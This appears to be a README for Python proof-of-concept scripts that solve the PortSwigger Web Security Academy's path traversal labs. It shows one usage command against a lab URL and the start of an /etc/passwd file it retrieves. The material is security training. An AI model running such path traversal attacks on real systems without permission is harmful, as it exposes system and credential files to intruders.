## Exploit PoCs for Path Traversal - Port Swigger Web Security Academy
This repository contains a series of Proof of Concepts (PoCs) in Python 3 to demonstrate Path Traversal vulnerabilities found in the Path Traversal module of the Port Swigger Web Security Academy.

## Description
The purpose of this repository is to provide code examples to exploit Path Traversal vulnerabilities in web applications. The PoCs provided here are intended for educational and research purposes only. Please use them responsibly and only on systems where you have permission to test.

## How to Use:
```bash
python3 path-traversal-lab-1.py https://0ae3006003d254ce83aeaff4003a009d.web-security-academy.net/     
[+]Path Traversal successfully exploited! Retrieving /etc/passwd file:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<SNIP>
```

## References:
https://portswigger.net/web-security/file-path-traversal

https://portswigger.net/web-security/all-labs#path-traversal